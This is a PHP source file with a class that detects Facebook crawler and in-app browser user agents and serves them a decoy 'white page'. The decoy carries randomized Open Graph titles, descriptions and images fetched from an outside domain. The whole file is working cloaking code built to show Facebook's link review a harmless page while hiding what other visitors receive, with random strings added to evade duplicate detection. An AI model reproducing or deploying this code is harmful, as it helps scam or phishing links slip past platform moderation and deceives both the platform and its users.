<?php
class DesktopProtection {
    private $fbDesktopBots = [
        'facebookexternalhit',
        'Facebot',
        'Facebook',
        'FBAV',
        'FBAN',
        'FB_IAB',
        'FB4A',
        'FBSS',
        'FBSV',
        'FBDV',
        'FBMD',
        'FBSN',
        'FBCR',
        'FBID',
        'FBLC',
        'FBOP'
    ];

    private $botImages = [
        'https://chatdatlng.biz.id/images/white1.jpg',
        'https://chatdatlng.biz.id/images/white2.jpg',
        'https://chatdatlng.biz.id/images/white3.jpg',
        'https://chatdatlng.biz.id/images/white4.jpg',
        'https://chatdatlng.biz.id/images/white5.jpg'
    ];

    public function isDesktopFacebookBot($userAgent) {
        foreach ($this->fbDesktopBots as $bot) {
            if (stripos($userAgent, $bot) !== false) {
                return true;
            }
        }
        return false;
    }

    public function serveWhitePage($linkData) {
        $title = htmlspecialchars($linkData['og']['title'] ?? '') . ' ' . $this->generateRandomString();
        $description = htmlspecialchars($linkData['og']['description'] ?? '') . ' ' . $this->generateRandomString();
        $image = $this->botImages[array_rand($this->botImages)] . '?v=' . $this->generateRandomString();
        $url = htmlspecialchars('https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
        header('Content-Type: text/html; charset=utf-8');
        echo <<<HTML
<!DOCTYPE html>
<html>
<head>
    <title>{$title}</title>
    <meta property="fb:app_id" content="1604020986967005" />
    <meta property="og:title" content="{$title}" />
    <meta property="og:description" content="{$description}" />
    <meta property="og:image" content="{$image}" />
    <meta property="og:image:width" content="1200" />
    <meta property="og:image:height" content="630" />
    <meta property="og:url" content="{$url}" />
    <meta property="og:type" content="website" />
</head>
<body>
    <div style="display:none;">{$description}</div>
</body>
</html>
HTML;
        exit;
    }

    private function generateRandomString($length = 6) {
        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        $str = '';
        for ($i = 0; $i < $length; $i++) {
            $str .= $chars[random_int(0, strlen($chars) - 1)];
        }
        return $str;
    }
}
?>
